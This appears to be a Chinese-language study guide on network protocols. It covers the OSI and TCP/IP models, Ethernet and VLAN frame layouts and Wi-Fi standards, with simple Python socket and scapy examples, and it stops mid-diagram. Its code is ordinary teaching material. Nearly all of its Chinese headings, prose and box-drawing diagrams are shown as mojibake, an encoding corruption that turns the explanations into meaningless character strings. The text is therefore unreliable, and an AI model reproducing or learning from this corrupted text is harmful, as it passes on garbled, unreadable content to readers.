# ç½‘ç»œåè®®ï¼ˆNetwork Protocolï¼‰æ·±åº¦å­¦ä¹ ç¬”è®°

## ğŸ“‹ å­¦ä¹ è·¯å¾„æ€»è§ˆ

```mermaid
graph LR
    A[åè®®åŸºç¡€æ¦‚å¿µ] --> B[åè®®åˆ†å±‚æ¨¡å‹]
    B --> C[ç‰©ç†å±‚ä¸é“¾è·¯å±‚åè®®]
    C --> D[ç½‘ç»œå±‚åè®®]
    D --> E[ä¼ è¾“å±‚åè®®]
    E --> F[åº”ç”¨å±‚åè®®]
    F --> G[IoTä¸ä¸“ç”¨åè®®]
    G --> H[åè®®å®‰å…¨ä¸ä¼˜åŒ–]
```

**é€‚ç”¨äººç¾¤**: 0-5å¹´å¼€å‘ç»éªŒã€ç½‘ç»œç¼–ç¨‹åˆå­¦è€…ã€å¸Œæœ›ç³»ç»Ÿå­¦ä¹ ç½‘ç»œåè®®çš„æŠ€æœ¯äººå‘˜
**é¢„è®¡å­¦ä¹ æ—¶é—´**: 60-80å°æ—¶
**å­¦ä¹ ç›®æ ‡**: æ·±å…¥ç†è§£ç½‘ç»œåè®®å·¥ä½œåŸç†ï¼ŒæŒæ¡åè®®äº¤äº’è¿‡ç¨‹å’Œæ•°æ®å¸§ç»“æ„ï¼Œå…·å¤‡åè®®åº”ç”¨å¼€å‘å’Œé—®é¢˜æ’æŸ¥èƒ½åŠ›

---

## ç¬¬ä¸€ç« ï¼šç½‘ç»œåè®®åŸºç¡€æ¦‚å¿µ

### 1.1 ä»€ä¹ˆæ˜¯ç½‘ç»œåè®®

#### æ ¸å¿ƒå®šä¹‰
ç½‘ç»œåè®®ï¼ˆNetwork Protocolï¼‰æ˜¯è®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œæ•°æ®äº¤æ¢è€Œå»ºç«‹çš„è§„åˆ™ã€æ ‡å‡†æˆ–çº¦å®šçš„é›†åˆã€‚å®ƒå®šä¹‰äº†é€šä¿¡åŒæ–¹å¦‚ä½•è¿›è¡Œæ•°æ®äº¤æ¢ï¼ŒåŒ…æ‹¬æ•°æ®æ ¼å¼ã€ä¼ è¾“é¡ºåºã€é”™è¯¯å¤„ç†ç­‰æ–¹é¢ã€‚

**åè®®çš„æœ¬è´¨**: ä¸€å¥—é€šä¿¡åŒæ–¹éƒ½ç†è§£å’Œéµå®ˆçš„"è¯­è¨€è§„èŒƒ"

#### åè®®çš„ä¸‰è¦ç´ 

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         ç½‘ç»œåè®®ä¸‰è¦ç´                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1. è¯­æ³•(Syntax)                          â”‚
â”‚    - æ•°æ®æ ¼å¼                             â”‚
â”‚    - ç¼–ç æ–¹å¼                             â”‚
â”‚    - ä¿¡å·ç”µå¹³                             â”‚
â”‚                                          â”‚
â”‚ 2. è¯­ä¹‰(Semantics)                       â”‚
â”‚    - æ§åˆ¶ä¿¡æ¯                             â”‚
â”‚    - é”™è¯¯å¤„ç†                             â”‚
â”‚    - åŒæ­¥æ–¹å¼                             â”‚
â”‚                                          â”‚
â”‚ 3. æ—¶åº(Timing)                          â”‚
â”‚    - é€Ÿåº¦åŒ¹é…                             â”‚
â”‚    - é¡ºåºæ§åˆ¶                             â”‚
â”‚    - è¶…æ—¶å¤„ç†                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### åè®®ç¤ºä¾‹è§£æ

**HTTPåè®®çš„ä¸‰è¦ç´ ä½“ç°**:

```http
# è¯­æ³•: HTTPè¯·æ±‚æ ¼å¼
GET /api/users HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: application/json

# è¯­ä¹‰: GETè¡¨ç¤ºè·å–èµ„æºï¼Œ/api/usersè¡¨ç¤ºèµ„æºè·¯å¾„
# æ—¶åº: å®¢æˆ·ç«¯å‘é€è¯·æ±‚åç­‰å¾…å“åº”ï¼Œè¶…æ—¶æ—¶é—´é€šå¸¸ä¸º30-60ç§’
```

### 1.2 åè®®çš„åˆ†ç±»

#### æŒ‰åŠŸèƒ½åˆ†ç±»

| åˆ†ç±» | ä½œç”¨ | å…¸å‹åè®® | åº”ç”¨åœºæ™¯ |
|------|------|---------|---------|
| **ä¼ è¾“åè®®** | è´Ÿè´£æ•°æ®å¯é ä¼ è¾“ | TCP, UDP, QUIC | æ–‡ä»¶ä¼ è¾“ã€å®æ—¶é€šä¿¡ |
| **è·¯ç”±åè®®** | è´Ÿè´£è·¯å¾„é€‰æ‹© | RIP, OSPF, BGP | è·¯ç”±å™¨é—´é€šä¿¡ |
| **åº”ç”¨åè®®** | æä¾›åº”ç”¨å±‚æœåŠ¡ | HTTP, FTP, SMTP | Webè®¿é—®ã€é‚®ä»¶å‘é€ |
| **ç½‘ç»œç®¡ç†åè®®** | ç½‘ç»œç›‘æ§å’Œç®¡ç† | SNMP, ICMP | ç½‘ç»œè¯Šæ–­ã€æ€§èƒ½ç›‘æ§ |
| **å®‰å…¨åè®®** | æä¾›åŠ å¯†å’Œè®¤è¯ | TLS/SSL, IPSec | å®‰å…¨é€šä¿¡ã€VPN |
| **IoTåè®®** | ç‰©è”ç½‘è®¾å¤‡é€šä¿¡ | MQTT, CoAP, CAN | ä¼ æ„Ÿå™¨ã€å·¥ä¸šæ§åˆ¶ |

#### æŒ‰å·¥ä½œæ¨¡å¼åˆ†ç±»

**1. é¢å‘è¿æ¥åè®® vs æ— è¿æ¥åè®®**

```python
# é¢å‘è¿æ¥åè®®ç¤ºä¾‹ (TCP)
import socket

# å»ºç«‹è¿æ¥
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('example.com', 80))

# å‘é€æ•°æ®ï¼ˆä¿è¯é¡ºåºå’Œå¯é æ€§ï¼‰
client.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')

# æ¥æ”¶å“åº”
response = client.recv(4096)

# å…³é—­è¿æ¥
client.close()
```

```python
# æ— è¿æ¥åè®®ç¤ºä¾‹ (UDP)
import socket

# æ— éœ€å»ºç«‹è¿æ¥
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ç›´æ¥å‘é€æ•°æ®ï¼ˆä¸ä¿è¯åˆ°è¾¾ï¼‰
message = b'Hello, UDP!'
udp_socket.sendto(message, ('example.com', 9999))

# æ¥æ”¶å“åº”ï¼ˆå¯èƒ½ä¸¢å¤±ï¼‰
data, addr = udp_socket.recvfrom(1024)

udp_socket.close()
```

**å¯¹æ¯”åˆ†æ**:

| ç‰¹æ€§ | é¢å‘è¿æ¥ï¼ˆTCPï¼‰ | æ— è¿æ¥ï¼ˆUDPï¼‰ |
|------|----------------|--------------|
| **è¿æ¥å»ºç«‹** | éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ | ä¸éœ€è¦ |
| **å¯é æ€§** | å¯é ä¼ è¾“ï¼Œä¿è¯é¡ºåº | ä¸å¯é ï¼Œå¯èƒ½ä¸¢å¤± |
| **é€Ÿåº¦** | è¾ƒæ…¢ï¼ˆæœ‰ç¡®è®¤æœºåˆ¶ï¼‰ | å¿«é€Ÿï¼ˆæ— é¢å¤–å¼€é”€ï¼‰ |
| **å¼€é”€** | å¤´éƒ¨20-60å­—èŠ‚ | å¤´éƒ¨8å­—èŠ‚ |
| **åº”ç”¨åœºæ™¯** | æ–‡ä»¶ä¼ è¾“ã€Webæµè§ˆ | è§†é¢‘ç›´æ’­ã€DNSæŸ¥è¯¢ |

---

## ç¬¬äºŒç« ï¼šåè®®åˆ†å±‚æ¨¡å‹

### 2.1 OSIä¸ƒå±‚æ¨¡å‹

#### æ¨¡å‹ç»“æ„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  7. åº”ç”¨å±‚ (Application Layer)                â”‚  HTTP, FTP, SMTP, DNS
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  6. è¡¨ç¤ºå±‚ (Presentation Layer)               â”‚  åŠ å¯†ã€å‹ç¼©ã€ç¼–ç 
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  5. ä¼šè¯å±‚ (Session Layer)                    â”‚  ä¼šè¯ç®¡ç†ã€åŒæ­¥
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  4. ä¼ è¾“å±‚ (Transport Layer)                  â”‚  TCP, UDP
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  3. ç½‘ç»œå±‚ (Network Layer)                    â”‚  IP, ICMP, ARP
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  2. æ•°æ®é“¾è·¯å±‚ (Data Link Layer)              â”‚  Ethernet, Wi-Fi
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. ç‰©ç†å±‚ (Physical Layer)                   â”‚  ç”µç¼†ã€å…‰çº¤ã€æ— çº¿ç”µ
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### å„å±‚è¯¦ç»†åŠŸèƒ½

**1. ç‰©ç†å±‚ (Physical Layer)**
- **åŠŸèƒ½**: ä¼ è¾“åŸå§‹æ¯”ç‰¹æµ
- **å…³é”®æŠ€æœ¯**: è°ƒåˆ¶è§£è°ƒã€ä¿¡å·ç¼–ç ã€ç”µæ°”ç‰¹æ€§
- **è®¾å¤‡**: é›†çº¿å™¨(Hub)ã€ä¸­ç»§å™¨(Repeater)
- **åè®®æ ‡å‡†**: RS-232, RJ45, 10BASE-T

**2. æ•°æ®é“¾è·¯å±‚ (Data Link Layer)**
- **åŠŸèƒ½**: æä¾›å¯é çš„ç‚¹åˆ°ç‚¹æ•°æ®ä¼ è¾“
- **å…³é”®æŠ€æœ¯**: MACåœ°å€ã€å¸§åŒæ­¥ã€é”™è¯¯æ£€æµ‹
- **è®¾å¤‡**: äº¤æ¢æœº(Switch)ã€ç½‘æ¡¥(Bridge)
- **å­å±‚**:
  - LLC (é€»è¾‘é“¾è·¯æ§åˆ¶)
  - MAC (åª’ä½“è®¿é—®æ§åˆ¶)

**3. ç½‘ç»œå±‚ (Network Layer)**
- **åŠŸèƒ½**: è·¯ç”±é€‰æ‹©ã€é€»è¾‘å¯»å€
- **å…³é”®æŠ€æœ¯**: IPåœ°å€ã€è·¯ç”±ç®—æ³•ã€åˆ†ç‰‡é‡ç»„
- **è®¾å¤‡**: è·¯ç”±å™¨(Router)ã€ä¸‰å±‚äº¤æ¢æœº
- **åè®®**: IP, ICMP, ARP, OSPF, BGP

**4. ä¼ è¾“å±‚ (Transport Layer)**
- **åŠŸèƒ½**: ç«¯åˆ°ç«¯å¯é ä¼ è¾“
- **å…³é”®æŠ€æœ¯**: æµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶ã€é”™è¯¯æ¢å¤
- **åè®®**: TCP, UDP, SCTP
- **ç«¯å£å·**: æ ‡è¯†åº”ç”¨ç¨‹åº (0-65535)

**5. ä¼šè¯å±‚ (Session Layer)**
- **åŠŸèƒ½**: å»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢ä¼šè¯
- **å…³é”®æŠ€æœ¯**: ä¼šè¯åŒæ­¥ã€æ£€æŸ¥ç‚¹ã€æ¢å¤
- **å…¸å‹åº”ç”¨**: RPC, NetBIOS

**6. è¡¨ç¤ºå±‚ (Presentation Layer)**
- **åŠŸèƒ½**: æ•°æ®æ ¼å¼è½¬æ¢
- **å…³é”®æŠ€æœ¯**: åŠ å¯†è§£å¯†ã€å‹ç¼©è§£å‹ã€ç¼–ç è½¬æ¢
- **æ ¼å¼**: ASCII, JPEG, MPEG, SSL/TLS

**7. åº”ç”¨å±‚ (Application Layer)**
- **åŠŸèƒ½**: ä¸ºåº”ç”¨ç¨‹åºæä¾›ç½‘ç»œæœåŠ¡
- **åè®®**: HTTP, FTP, SMTP, DNS, Telnet
- **æ¥å£**: Socket API

### 2.2 TCP/IPå››å±‚æ¨¡å‹

#### æ¨¡å‹å¯¹æ¯”

```
OSIä¸ƒå±‚æ¨¡å‹              TCP/IPå››å±‚æ¨¡å‹              æ•°æ®å°è£…
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   åº”ç”¨å±‚     â”‚        â”‚              â”‚        â”‚   æ•°æ®       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚   åº”ç”¨å±‚     â”‚        â”‚   (Data)     â”‚
â”‚   è¡¨ç¤ºå±‚     â”‚        â”‚              â”‚        â”‚              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚              â”‚        â”‚              â”‚
â”‚   ä¼šè¯å±‚     â”‚        â”‚              â”‚        â”‚              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ä¼ è¾“å±‚     â”‚   <==> â”‚   ä¼ è¾“å±‚     â”‚        â”‚  TCP/UDPæ®µ   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç½‘ç»œå±‚     â”‚   <==> â”‚   ç½‘ç»œå±‚     â”‚        â”‚   IPæ•°æ®åŒ…   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ•°æ®é“¾è·¯å±‚  â”‚        â”‚ ç½‘ç»œæ¥å£å±‚   â”‚        â”‚   ä»¥å¤ªç½‘å¸§   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚              â”‚        â”‚              â”‚
â”‚   ç‰©ç†å±‚     â”‚        â”‚              â”‚        â”‚   æ¯”ç‰¹æµ     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### æ•°æ®å°è£…è¿‡ç¨‹

```
åº”ç”¨æ•°æ® (Application Data)
    â†“
[TCPå¤´éƒ¨ | åº”ç”¨æ•°æ®] = TCPæ®µ (Segment)
    â†“
[IPå¤´éƒ¨ | TCPæ®µ] = IPæ•°æ®åŒ… (Packet)
    â†“
[ä»¥å¤ªç½‘å¤´éƒ¨ | IPæ•°æ®åŒ… | ä»¥å¤ªç½‘å°¾éƒ¨] = ä»¥å¤ªç½‘å¸§ (Frame)
    â†“
ç‰©ç†ä¿¡å· (Bits)
```

---

## ç¬¬ä¸‰ç« ï¼šç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚åè®®

### 3.1 Ethernet (ä»¥å¤ªç½‘) åè®®

#### Ethernetå¸§ç»“æ„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        ä»¥å¤ªç½‘å¸§ç»“æ„                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å‰å¯¼ç    â”‚ ç›®æ ‡MAC  â”‚ æºMAC    â”‚ ç±»å‹     â”‚ æ•°æ®     â”‚   FCS    â”‚
â”‚ Preamble â”‚   Dst    â”‚  Src     â”‚  Type    â”‚  Data    â”‚   CRC    â”‚
â”‚ 7 bytes  â”‚ 6 bytes  â”‚ 6 bytes  â”‚ 2 bytes  â”‚ 46-1500  â”‚ 4 bytes  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  SFD (å¸§èµ·å§‹å®šç•Œç¬¦) : 1 byte                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å­—æ®µè¯¦è§£**:

1. **å‰å¯¼ç  (Preamble)**: 7å­—èŠ‚ï¼Œç”¨äºåŒæ­¥
   ```
   10101010 10101010 10101010 10101010 10101010 10101010 10101010
   ```

2. **SFD (Start Frame Delimiter)**: 1å­—èŠ‚
   ```
   10101011  # æ ‡è¯†å¸§çš„çœŸæ­£å¼€å§‹
   ```

3. **ç›®æ ‡MACåœ°å€**: 6å­—èŠ‚
   ```
   ç¤ºä¾‹: FF:FF:FF:FF:FF:FF (å¹¿æ’­åœ°å€)
         00:1A:2B:3C:4D:5E (å•æ’­åœ°å€)
   ```

4. **æºMACåœ°å€**: 6å­—èŠ‚
   ```
   ç¤ºä¾‹: 00:0C:29:6F:8A:9B
   ```

5. **ç±»å‹/é•¿åº¦å­—æ®µ**: 2å­—èŠ‚
   ```
   0x0800: IPv4
   0x0806: ARP
   0x86DD: IPv6
   0x8100: VLANæ ‡ç­¾
   ```

6. **æ•°æ®å­—æ®µ**: 46-1500å­—èŠ‚
   - æœ€å°46å­—èŠ‚ï¼ˆä¸è¶³éœ€å¡«å……ï¼‰
   - æœ€å¤§1500å­—èŠ‚ï¼ˆMTUï¼‰

7. **FCS (Frame Check Sequence)**: 4å­—èŠ‚CRCæ ¡éªŒ

#### Ethernetå·¥ä½œåŸç†

**CSMA/CD (è½½æ³¢ä¾¦å¬å¤šè·¯è®¿é—®/å†²çªæ£€æµ‹)**

```
å‘é€æµç¨‹:
1. ç›‘å¬ä¿¡é“ â†’ ç©ºé—²?
   â”œâ”€ æ˜¯ â†’ å‘é€æ•°æ®
   â””â”€ å¦ â†’ ç»§ç»­ç›‘å¬

2. å‘é€è¿‡ç¨‹ä¸­ç›‘å¬å†²çª
   â”œâ”€ æ— å†²çª â†’ å‘é€å®Œæˆ
   â””â”€ æ£€æµ‹åˆ°å†²çª â†’ åœæ­¢å‘é€
       â”œâ”€ å‘é€å¹²æ‰°ä¿¡å·
       â”œâ”€ ç­‰å¾…éšæœºæ—¶é—´
       â””â”€ é‡æ–°å‘é€
```

**å®æˆ˜ç¤ºä¾‹ï¼šæŠ“å–ä»¥å¤ªç½‘å¸§**

```python
from scapy.all import *

def analyze_ethernet_frame(packet):
    """åˆ†æä»¥å¤ªç½‘å¸§"""
    if packet.haslayer(Ether):
        eth = packet[Ether]
        print(f"æºMAC: {eth.src}")
        print(f"ç›®æ ‡MAC: {eth.dst}")
        print(f"ç±»å‹: {hex(eth.type)}")

        # è§£æä¸Šå±‚åè®®
        if eth.type == 0x0800:
            print("ä¸Šå±‚åè®®: IPv4")
        elif eth.type == 0x0806:
            print("ä¸Šå±‚åè®®: ARP")
        elif eth.type == 0x86DD:
            print("ä¸Šå±‚åè®®: IPv6")

# æŠ“åŒ…åˆ†æ
sniff(prn=analyze_ethernet_frame, count=10)
```

#### VLAN (è™šæ‹Ÿå±€åŸŸç½‘)

**VLANæ ‡ç­¾æ ¼å¼**:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  TPID (Tag Protocol Identifier)    â”‚  0x8100 (2 bytes)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  TCI (Tag Control Information)     â”‚  2 bytes
â”‚  â”œâ”€ PRI (Priority): 3 bits         â”‚
â”‚  â”œâ”€ CFI (Canonical Format): 1 bit  â”‚
â”‚  â””â”€ VID (VLAN ID): 12 bits         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**VLANé…ç½®ç¤ºä¾‹**:

```python
from scapy.all import Ether, Dot1Q, IP, ICMP

# åˆ›å»ºå¸¦VLANæ ‡ç­¾çš„æ•°æ®åŒ…
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=10) / \
         IP(dst="192.168.1.1") / \
         ICMP()

# æŸ¥çœ‹æ•°æ®åŒ…ç»“æ„
packet.show()
```

### 3.2 Wi-Fi (æ— çº¿å±€åŸŸç½‘) åè®®

#### Wi-Fiåè®®æ—

| æ ‡å‡† | é¢‘æ®µ | æœ€å¤§é€Ÿç‡ | å‘å¸ƒå¹´ä»½ | ç‰¹ç‚¹ |
|------|------|---------|---------|------|
| **802.11b** | 2.4 GHz | 11 Mbps | 1999 | æœ€æ—©çš„å•†ç”¨æ ‡å‡† |
| **802.11a** | 5 GHz | 54 Mbps | 1999 | æŠ—å¹²æ‰°èƒ½åŠ›å¼º |
| **802.11g** | 2.4 GHz | 54 Mbps | 2003 | å…¼å®¹802.11b |
| **802.11n** | 2.4/5 GHz | 600 Mbps | 2009 | MIMOæŠ€æœ¯ |
| **802.11ac** | 5 GHz | 6.93 Gbps | 2013 | MU-MIMO |
| **802.11ax (Wi-Fi 6)** | 2.4/5 GHz | 9.6 Gbps | 2019 | OFDMA |
| **802.11be (Wi-Fi 7)** | 2.4/5/6 GHz | 46 Gbps | 2024 | MLO |

#### Wi-Fiå¸§ç»“æ„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    802.11 MACå¸§æ ¼å¼                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Frame â”‚Durationâ”‚Addr1 â”‚Addr2 â”‚Addr3 â”‚Seq  â”‚Addr4 â”‚Frame Bodyâ”‚FCSâ”‚
â”‚Controlâ”‚/ID   â”‚      â”‚      â”‚      â”‚Ctrl â”‚      â”‚          â”‚   â”‚
â”‚2 bytesâ”‚2 bytesâ”‚6 bytesâ”‚6 bytesâ”‚6 bytesâ”‚2 bytesâ”‚6 bytesâ”‚0-2312â”‚4 bytesâ”‚
â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”˜
```

**Frame Controlå­—æ®µè¯¦è§£**:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     Frame Control (2 bytes)        â”‚
â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Versionâ”‚Typeâ”‚SubTypeâ”‚To DSâ”‚From DSâ”‚More Fragâ”‚Retryâ”‚Power Mgmtâ”‚More Dataâ”‚WEPâ”‚Orderâ”‚
â”‚2 bits â”‚2 bitsâ”‚4 bits â”‚1 bitâ”‚1 bit â”‚1 bit   â”‚1 bitâ”‚1 bit    â”‚1 bit   â”‚1 bitâ”‚1 bitâ”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å¸§ç±»å‹**:

1. **ç®¡ç†å¸§ (Management Frame)**
   - Beacon: ä¿¡æ ‡å¸§ï¼ŒAPå®šæœŸå¹¿æ’­
   - Probe Request/Response: æ¢æµ‹è¯·æ±‚/å“åº”
   - Authentication: è®¤è¯
   - Association Request/Response: å…³è”è¯·æ±‚/å“åº”
   - Deauthentication: è§£é™¤è®¤è¯

2. **æ§åˆ¶å¸§ (Control Frame)**
   - RTS (Request To Send): è¯·æ±‚å‘é€
   - CTS (Clear To Send): å…è®¸å‘é€
   - ACK: ç¡®è®¤å¸§

3. **æ•°æ®å¸§ (Data Frame)**
   - ä¼ è¾“å®é™…æ•°æ®

#### Wi-Fiè¿æ¥è¿‡ç¨‹

```
å®¢æˆ·ç«¯                                  AP (æ¥å…¥ç‚¹)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Probe Request â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (æ‰«æå¯ç”¨ç½‘ç»œ)
